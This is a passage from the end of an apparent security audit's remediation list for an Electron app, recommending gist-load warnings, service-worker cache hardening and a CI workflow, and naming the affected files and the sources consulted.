7. **Raise the shared-code warning on both gist load paths**, stop raising it for first-party `Examples`/`Sessions`/`Samples` navigation (add a `trusted: true` flag to `location.state`), and make the desktop copy name the actual risk. Fixes W4 and the inversion in W5.
8. **Guard the SW cache** — verify `response.ok` before `cache.put`, and add an integrity check or drop cache-first in favour of stale-while-revalidate for `/assets/`. Reduces W1; note that a determined same-origin attacker can still write to Cache Storage, so this is mitigation, not elimination — the real fix for W1 is not executing hostile code, which the product cannot promise.
9. **Add `.github/workflows/ci.yml`** running `tsc --noEmit && vitest run && eslint . && npm audit --audit-level=high`, and add `electron` to a type-checked tsconfig (`electron/` is currently invisible to `npm run build`, so a type error in the IPC layer ships silently).

**Files that carry the confirmed risk:** `electron/ipc/file.ts` · `electron/preload.ts` · `electron/main.ts` · `electron/ipc/app.ts` · `electron/ipc/audio.ts` · `build/entitlements.mac.plist` · `build/entitlements.mac.inherit.plist` · `package.json` · `src/lib/persistence/gist.ts` · `src/sw.template.js` · `src/pages/Editor.tsx` · `src/components/organisms/GistDialog.tsx` · `src/components/organisms/DetailPanel.tsx` · `netlify.toml` · `src/data/legal.ts`

Sources: [Electron Security docs](https://www.electronjs.org/docs/latest/tutorial/security) · [GHSA-h7rp-cf8h-j98x / CVE-2026-70601](https://advisories.gitlab.com/npm/electron/CVE-2026-70601/) · [Electron 41.6.1 release](https://github.com/electron/electron/releases/tag/v41.6.1) · [CSP under file:// in Electron](https://blog.coding.kiwi/electron-csp-local/)